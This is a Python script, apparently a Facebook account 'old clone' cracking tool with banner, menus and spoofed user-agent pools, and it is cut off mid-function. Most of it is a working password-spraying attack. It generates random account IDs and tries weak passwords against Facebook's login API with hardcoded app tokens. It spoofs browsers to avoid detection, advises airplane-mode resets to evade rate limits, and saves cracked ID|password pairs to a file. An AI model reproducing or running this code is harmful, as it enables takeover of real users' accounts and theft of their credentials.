    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Example: print 5 random user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; U; Android 2.2;'
    b = random.choice(['6','7','8','9','10','11','12'])
    c = 'fr-fr; Desire_A8181 Build/'
    d = random.choice([chr(i) for i in range(65, 91)])  # Random letter A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # Random letter A-Z
    g = 'FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = ' 4.0 Mobile Safari/533.1'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Example: print 5 random user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):
    aa = 'Mozilla/5.0 (SMART-TV;'
    b = random.choice(['6','7','8','9','10','11','12'])
    c = 'Linux; Tizen 2.4.0)'
    d = random.choice([chr(i) for i in range(65, 91)])  # Random letter A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # Random letter A-Z
    g = 'AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 tv'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Safari/538.1'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Example: print 5 random SMART-TV user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; U; Android 2.3.6;'
    b = random.choice(['6','7','8','9','10','11','12'])
    c = 'fr-fr; GT-S5839i Build/'
    d = random.choice([chr(i) for i in range(65, 91)])  # Random letter A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # Random letter A-Z
    g = ' GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = '4.0 Mobile Safari/534.30'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Example: print 5 random Gingerbread user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 4.0.4;'
    b = random.choice(['6','7','8','9','10','11','12'])
    c = 'LT30p Build/'
    d = random.choice([chr(i) for i in range(65, 91)])  # Random letter A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # Random letter A-Z
    g = '7.0.A.3.195) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = '18.0.1025.166 Mobile Safari/535.19'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Example: print 5 random Ice Cream Sandwich user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 11;'
    b = random.choice(['7.0','8.1.0','9','10','11','12'])
    c = random.choice(['CPH1969 Build/RP1A.200720.011; wv)'])
    d = random.choice([chr(i) for i in range(65, 91)])  # Random letter A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # Random letter A-Z
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80,103)
    i = '0'
    j = random.randrange(4200,4900)
    k = random.randrange(40,150)
    l = 'Versi/4.0 Chrome/105.0.5195.136 Seluler Safari/537.36 WpsMoffice/16.6/arm64-v8a/1347'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Example: print 5 random Android 11 user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 7.0;'
    b = random.choice(['7.0','8.1.0','9','10','11','12'])
    c = random.choice(['Redmi Note 4 Build/NRD90M)'])
    d = random.choice([chr(i) for i in range(65, 91)])  # Random letter A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # Random letter A-Z
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80,103)
    i = '0'
    j = random.randrange(4200,4900)
    k = random.randrange(40,150)
    l = 'Chrome/63.0.3239.111 Mobile Safari/537.36'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Example: print 5 random Android 7 user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000): 	
    aa = 'Mozilla/5.0 (Linux; Android 11;'
    b = random.choice(['7.0','8.1.0','9','10','11','12'])
    c = random.choice(['Redmi Note 9 Pro'])
    d = random.choice([chr(i) for i in range(65, 91)])  # Random letter A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # Random letter A-Z
    g = 'Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80,103)
    i = '0'
    j = random.randrange(4200,4900)
    k = random.randrange(40,150)
    l = 'Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Example: print 5 random user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000): 	
    aa = 'Mozilla/5.0 (Linux; Android 11;'
    b = random.choice(['7.0','8.1.0','9','10','11','12'])
    c = random.choice(['ASUS_I005DA)'])
    d = random.choice([chr(i) for i in range(65, 91)])  # A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # A-Z
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80,103)
    i = '0'
    j = random.randrange(4200,4900)
    k = random.randrange(40,150)
    l = 'Chrome/102.0.0.0 Mobile Safari/537.36'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Example: print 5 random user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000): 	
    aa = 'Mozilla/5.0 (Linux; Android 10;'
    b = random.choice(['7.0','8.1.0','9','10','11','12'])
    c = random.choice(['Vivo Y91C)'])
    d = random.choice([chr(i) for i in range(65, 91)])  # A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # A-Z
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80,103)
    i = '0'
    j = random.randrange(4200,4900)
    k = random.randrange(40,150)
    l = 'Chrome/98.0.4711.185 Mobile Safari/537.36'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Example: print 5 random user agents
for _ in range(5):
    print(random.choice(ugen))

   
import random

ugen = []

for xd in range(10000):	
    aa = 'Mozilla/5.0 (Linux; Android 11;'
    b = random.choice(['7.0','8.1.0','9','10','11','12'])
    c = random.choice(['M2012K11AG Build/'])
    d = random.choice([chr(i) for i in range(65, 91)])  # A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # A-Z
    g = 'RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80,103)
    i = '0'
    j = random.randrange(4200,4900)
    k = random.randrange(40,150)
    l = 'Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 WpsMoffice/16.3.2/arm64-v8a/1328'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Example: print 5 random user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):	
    aa = 'Mozilla/5.0 (Linux; Android 11;'
    b = random.choice(['7.0','8.1.0','9','10','11','12'])
    c = 'Vivo Y91C)'
    d = random.choice([chr(i) for i in range(65, 91)])  # Random uppercase letter A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # Random uppercase letter A-Z
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80,103)
    i = '0'
    j = random.randrange(4200,4900)
    k = random.randrange(40,150)
    l = 'Chrome/97.0.4740.200 Mobile Safari/537.36'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

# Example: print 5 random user agents
for _ in range(5):
    print(random.choice(ugen))

import random

ugen = []

for xd in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 8.1.0;'
    b = random.choice(['7.0','8.1.0','9','10','11','12'])
    c = 'CPH1909 Build/O11019 )'
    d = random.choice([chr(i) for i in range(65, 91)])  # Random uppercase letter A-Z
    e = random.randrange(1, 999)
    f = random.choice([chr(i) for i in range(65, 91)])  # Random uppercase letter A-Z
    g = 'AppleWebKit/537.36 (KHTML, like Gecko)'
    h = random.randrange(80,103)
    i = '0'
    j = random.randrange(4200,4900)
    k = random.randrange(40,150)
    l = 'JioBrowser/1.4.7 Chrome/69.0.3497.100 Mobile Safari/537.36'

    uaku2 = f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

import random

def arnold():
    """
    Perfect UA Pool for 2009–2012 Facebook Old IDs (Best Results 2025 में भी)
    Real browsers जो उस समय use होते थे → Zero detection
    """

    # ============ WINDOWS (2009-2012) ============
    def windows_old():
        ua_list = [
            # Chrome 10-18 (2011-2012)
            f"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.{random.randint(1,24)} (KHTML, like Gecko) Chrome/{random.randint(13,18)}.0.{random.randint(800,1200)}.0 Safari/535.{random.randint(1,24)}",
            f"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.{random.randint(10,25)} (KHTML, like Gecko) Chrome/{random.randint(14,18)}.0.{random.randint(900,1300)}.0 Safari/535.{random.randint(10,25)}",

            # Firefox 4.0 - 10.0 (2011-2012)
            f"Mozilla/5.0 (Windows NT 6.1; rv:{random.randint(5,10)}.0) Gecko/20100101 Firefox/{random.randint(5,10)}.0",
            f"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:{random.randint(6,10)}.0) Gecko/20100101 Firefox/{random.randint(6,10)}.0.{random.randint(1,3)}",

            # Internet Explorer 8 & 9 (2009-2012 में सबसे ज़्यादा)
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",

            # Opera 11-12 (2011-2012)
            f"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1 Opera/{random.randint(11,12)}.{random.randint(1000,1850)}",
        ]
        return random.choice(ua_list)

    # ============ ANDROID (2010-2012) - बहुत कम थे, लेकिन जो थे वो perfect ============
    def android_old():
        ua_list = [
            # Android 2.3 Gingerbread + Stock Browser (2010-2012)
            "Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; GT-I9100 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
            "Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
            "Mozilla/5.0 (Linux; U; Android 2.3.5; en-gb; HTC_DesireHD_A9191 Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",

            # Early Chrome Mobile (2012)
            "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19",
        ]
        return random.choice(ua_list)

    # ============ iPHONE / iPAD (2009-2012) - उस समय Facebook का 70% traffic ============
    def ios_old():
        ua_list = [
            # iOS 4 - 5 (2010-2012)
            f"Mozilla/5.0 (iPhone; U; CPU iPhone OS {random.choice(['4_3_3','4_3_5','5_0_1','5_1_1'])} like Mac OS X; en-us) AppleWebKit/534.{random.randint(30,50)} (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.{random.randint(10,40)}",
            f"Mozilla/5.0 (iPod; U; CPU iPhone OS {random.choice(['4_3_2','5_0'])} like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5",
            f"Mozilla/5.0 (iPad; U; CPU OS {random.choice(['4_3_5','5_1_1'])} like Mac OS X; en-us) AppleWebKit/534.{random.randint(40,50)} (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.{random.randint(40,60)}",

            # Facebook App iOS (2011-2012)
            f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.choice(['5_0_1','5_1_1'])} like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A334",
            f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.choice(['5_1','5_1_1'])} like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9B176",
        ]
        return random.choice(ua_list)

    # ============ JAVA / FEATURE PHONES (2009-2012 में बहुत use होते थे) ============
    def java_old():
        ua_list = [
            "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/11.0.026; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
            "NokiaN70-1/5.0610.0.0.6 Series60/2.8 Profile/MIDP-2.0 Configuration/CLDC-1.1",
            "SonyEricssonW995/R1EA Browser/NetFront/3.4 Profile/MIDP-2.1 Configuration/JAVA-1.0",
            "Mozilla/5.0 (Linux; U; Android 2.1-update1; en-us; HTC Dream) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17",
        ]
        return random.choice(ua_list)

    # ============ FINAL SELECTION WITH REALISTIC WEIGHTS (2012 style) ============
    return random.choices(
        population=[windows_old(), ios_old(), android_old(), java_old()],
        weights   =[45,          40,        10,          5],  # Windows + iPhone = 85% traffic उस समय
        k=1
    )[0]

 
os.system('xdg-open https://www.facebook.com/hamzakhan.channa.9')
 
def linex():print(f'\r\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def line():print(f'\r\n\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
Vs="0.0.2"
logo = f""t██████  ▄▄▄  ▄▄▄▄   ▄▄▄   ▄▄▄  ▄▄  ▄▄   ▄▄ ▄▄   ▄▄   ▄▄  ▄▄▄   ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄   ▄▄ 
 ▄▄▀▀  ██▀██ ██▄█▄ ██▀██ ██▀██ ███▄██  
 ▀█▄█▀   ██ ▄ ██ ██▀██ ███▄▄ ██▄▄  ██▄▄  ██▀▄▀██ 
██████ ██▀██ ██ ██ ▀███▀ ▀███▀ ██ ▀██   ██ ██    ▀█▀█▀  ██▀██ ▄▄██▀ ██▄▄▄ ██▄▄▄ ██   ██
                                         

\033[1;37m════════════════════════════════════════\033[1;33m
\033[1;91m OWNER       : Zaroon x Waseem
\033[1;92m FACEBOOK    : Zaroon x Waseem
\033[1;91m VERSION     : 10.9
\033[1;92m TOOL TYPES  : FREe
\033[1;37m════════════════════════════════════════\033[1;33m
\033[1;92m TH3 L3G3ND B0Y Zaroon x Waseem Hare
\033[1;37m════════════════════════════════════════\033[1;33m"""


def clear():
	os.system('clear');print(logo)
 
def main():
	clear()
	animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
	for i in range(30):
		time.sleep(0.1)
		sys.stdout.write(f"\r{r}[{w}ᯤ{r}]{s} LOADING...\033[97;1m " + animation[i % len(animation)] +"\x1b[0m ")
		sys.stdout.flush()
	clear()
	print(f'\33[38;5;160m[\033[1;97m1\33[38;5;160m] \033[1;97mOLD CLONE \33[38;5;160m[\33[38;5;37m2007\33[38;5;160m/\33[38;5;37m2008\33[38;5;160m]\033[1;97m')
	print(f'\33[38;5;160m[\033[1;97m2\33[38;5;160m] \033[1;97mOLD CLONE \33[38;5;160m[\33[38;5;37m2009\33[38;5;160m/\33[38;5;37m2010\33[38;5;160m]\033[1;97m')
	print(f'\33[38;5;160m[\033[1;97m3\33[38;5;160m] \033[1;97mOLD CLONE \33[38;5;160m[\33[38;5;37m2011\33[38;5;160m/\33[38;5;37m2012\33[38;5;160m]\033[1;97m')
	print(f'\33[38;5;160m[\033[1;97m4\33[38;5;160m] \033[1;97mOLD CLONE \33[38;5;160m[\33[38;5;37m2013\33[38;5;160m/\33[38;5;37m2014\33[38;5;160m]\033[1;97m')
	linex()
	ch = input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
	if ch in ('1','01','11','A','১','০১','a','A'):
		__Old1__()
	elif ch in ('2','02','22','b','B'):
		__Old2__()
	elif ch in ('3','33','03','c','C'):
		__Old3__()
	elif ch in ('4','04','44','D','d'):
		__Old4__()
 
def __Old1__():
    user=[]
    clear()
    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
    linex()
    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
    linex()
    year_code = '100000'
    for i in range(int(limit)):
    	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
    with tred(max_workers=30) as jihad:
        clear()
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
        linex()
        for mal in user:
        	uid=year_code+mal
        	jihad.submit(login1,uid)
    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()
 
 
def __Old2__():
    user=[]
    clear()
    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
    linex()
    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
    linex()
    year_code = '10000'
    for i in range(int(limit)):
    	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
    with tred(max_workers=30) as jihad:
        clear()
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
        linex()
        for mal in user:
            uid=year_code+mal
            jihad.submit(login2,uid)
    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()
 
def __Old3__():
    user=[]
    clear()
    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
    linex()
    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
    linex()
    year_code = '10000'
    for i in range(int(limit)):
    	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
    with tred(max_workers=30) as jihad:
        clear()
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
        linex()
        for mal in user:
            uid=year_code+mal
            jihad.submit(login3,uid)
    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()
 
def __Old4__():
    user=[]
    clear()
    print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  ▶\033[1;97m 10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000')
    linex()
    limit=input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
    linex()
    year_code = '10000'
    for i in range(int(limit)):
    	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
    with tred(max_workers=30) as jihad:
        clear()
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160m▶ \033[1;97m{limit}')
        print(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
        linex()
        for mal in user:
            uid=year_code+mal
            jihad.submit(login4,uid)            
    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()
 
def login1(uid):
    global oks,loop,cps
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mFEROZ\33[38;5;37m-\x1b[38;5;46mS1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua = windows()
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password', 
            'error_detail_type': 'button_with_disabled', 
            'source': 'device_based_login', 
            'email':str(uid),
            'password':str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'generate_session_cookies': '1', 
            'meta_inf_fbmeta': '', 
            'advertiser_id':str(uuid.uuid4()),
            'currently_logged_in_userid': '0', 
            'locale': 'en_US',
            'client_country_code': 'US', 
            'method': 'auth.login', 
            'fb_api_req_friendly_name': 'authenticate', 
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
            'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': arnold(),
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE', 
            'X-Tigon-Is-Retry': 'False', 
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
            'x-fb-device-group': '5120', 
            'X-FB-Friendly-Name': 'ViewerReactionsMutation', 
            'X-FB-Request-Analytics-Tags': 'graphservice', 
            'X-FB-HTTP-Engine': 'Liger', 
            'X-FB-Client-IP': 'True', 
            'X-FB-Server-Cluster': 'True', 
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 
            'Content-Length': '706'}
            url = "https://b-graph.facebook.com/auth/login"
            rp = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "session_key" in rp:            	
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mFEROZ\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/FEROZ-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                break
            elif "www.facebook.com" in rp['error']['message']:
                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mFEROZ\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                open("/sdcard/FEROZ-M1-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except Exception as e:time.sleep(30)
def login2(uid):
    global oks,loop,cps
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mFEROZ\33[38;5;37m-\x1b[38;5;46mS2\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua = windows()
        for pw in ["123456","1234567","12345678","123456789","111222"]:
            data = {'adid':str(uuid.uuid4()),
            'format': 'json',
            'device_id':str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password', 
            'error_detail_type': 'button_with_disabled', 
            'source': 'device_based_login', 
            'email':str(uid),
            'password':str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'generate_session_cookies': '1', 
            'meta_inf_fbmeta': '', 
            'advertiser_id':str(uuid.uuid4()),
            'currently_logged_in_userid': '0', 
            'locale': 'en_US',
            'client_country_code': 'US', 
            'method': 'auth.login', 
            'fb_api_req_friendly_name': 'authenticate', 
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
            'api_key': '882a8490361da98702bf97a021ddc14d'}
            head = {'User-Agent': arnold(),
            'Content-Type': 'application/x-www-form-urlencoded', 
            'Host': 'graph.facebook.com', 
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE', 
